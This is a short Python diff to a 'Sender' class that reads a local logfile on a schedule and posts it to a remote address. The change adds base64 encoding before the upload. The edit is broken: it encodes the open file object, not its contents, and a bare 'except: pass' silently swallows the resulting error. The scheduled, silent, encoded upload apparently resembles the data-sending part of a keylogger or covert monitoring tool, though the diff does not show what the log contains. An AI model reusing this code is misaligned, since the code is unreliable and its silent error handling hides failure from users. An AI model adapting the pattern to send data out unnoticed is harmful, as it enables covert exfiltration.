@@ -1,6 +1,7 @@
 import requests as r
 import threading
 import schedule
+import base64
 
 class Sender():
     def __init__(self, remote = "http://127.0.0.1", logfile = "./logfile"):
@@ -15,7 +16,8 @@ class Sender():
     def collect(self):
         try:
             with open(self.logfile, 'rb') as f:
-                resp = r.post(self.remote, files={'logfile.txt': f})
+                encoded = base64.b64encode(f) 
+                resp = r.post(self.remote, files={'logfile.txt': encoded})
         except:
             pass
                 
